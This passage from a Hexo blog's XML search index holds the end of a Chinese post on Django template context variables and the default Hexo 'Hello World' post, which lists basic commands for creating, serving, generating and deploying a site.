<strong>context</strong>字典中元素的键值<strong>hello</strong>对应了模板HTML文件中的变量<strong>hello</strong>.</p>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/16107.html"/>
      <url>/16107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
